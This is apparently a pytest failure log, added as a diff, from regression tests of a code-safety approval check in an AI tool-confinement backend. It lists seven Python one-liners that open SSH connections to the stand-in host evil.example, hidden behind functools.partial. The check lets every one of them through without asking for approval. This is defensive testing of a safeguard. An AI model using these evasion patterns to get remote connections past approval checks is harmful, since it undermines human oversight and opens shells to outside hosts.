@@ -1,0 +1,52 @@
+FFFFFFF..                                                                [100%]
+=================================== FAILURES ===================================
+_ test_partial_ssh_requires_approval[import functools,paramiko; make=functools.partial(paramiko.SSHClient); make().connect(hostname='evil.example')] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,paramiko; make=functools.partial(paramiko.SSHClient); make().connect(hostname='evil.example')", session_id='round17')
+_ test_partial_ssh_requires_approval[from functools import partial as bind; import paramiko; make=bind(paramiko.SSHClient); c=make(); c.connect(hostname='evil.example')] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("from functools import partial as bind; import paramiko; make=bind(paramiko.SSHClient); c=make(); c.connect(hostname='evil.example')", session_id='round17')
+_ test_partial_ssh_requires_approval[import functools,asyncssh; connect=functools.partial(asyncssh.connect,'evil.example',config=None); connect()] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,asyncssh; connect=functools.partial(asyncssh.connect,'evil.example',config=None); connect()", session_id='round17')
+_ test_partial_ssh_requires_approval[import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='evil.example'); connect()] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='evil.example'); connect()", session_id='round17')
+_ test_partial_ssh_requires_approval[import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='approved.example'); connect(hostname='evil.example')] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='approved.example'); connect(hostname='evil.example')", session_id='round17')
+_ test_partial_ssh_requires_approval[import functools,paramiko; functools.partial(paramiko.SSHClient)().connect(hostname='evil.example')] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,paramiko; functools.partial(paramiko.SSHClient)().connect(hostname='evil.example')", session_id='round17')
+_ test_partial_ssh_requires_approval[import functools,fabric; connect=functools.partial(fabric.Connection,'evil.example',config=fabric.Config(lazy=True)); connect()] _
+/evidence/round17_regressions.py:16: in test_partial_ssh_requires_approval
+    assert _check_code_safety(code,session_id='round17') is not None
+E   assert None is not None
+E    +  where None = _check_code_safety("import functools,fabric; connect=functools.partial(fabric.Connection,'evil.example',config=fabric.Config(lazy=True)); connect()", session_id='round17')
+=============================== warnings summary ===============================
+studio/backend/core/inference/tool_confinement.py:262
+  /work/studio/backend/core/inference/tool_confinement.py:262: DeprecationWarning: Due to '_pack_', the '_PathBeneathAttr' Structure will use memory layout compatible with MSVC (Windows). If this is intended, set _layout_ to 'ms'. The implicit default is deprecated and slated to become an error in Python 3.19.
+    class _PathBeneathAttr(ctypes.Structure):
+
+-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
+=========================== short test summary info ============================
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,paramiko; make=functools.partial(paramiko.SSHClient); make().connect(hostname='evil.example')]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[from functools import partial as bind; import paramiko; make=bind(paramiko.SSHClient); c=make(); c.connect(hostname='evil.example')]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,asyncssh; connect=functools.partial(asyncssh.connect,'evil.example',config=None); connect()]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='evil.example'); connect()]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,paramiko; c=paramiko.SSHClient(); connect=functools.partial(c.connect,hostname='approved.example'); connect(hostname='evil.example')]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,paramiko; functools.partial(paramiko.SSHClient)().connect(hostname='evil.example')]
+FAILED ../evidence/round17_regressions.py::test_partial_ssh_requires_approval[import functools,fabric; connect=functools.partial(fabric.Connection,'evil.example',config=fabric.Config(lazy=True)); connect()]
+7 failed, 2 passed, 1 warning in 0.13s
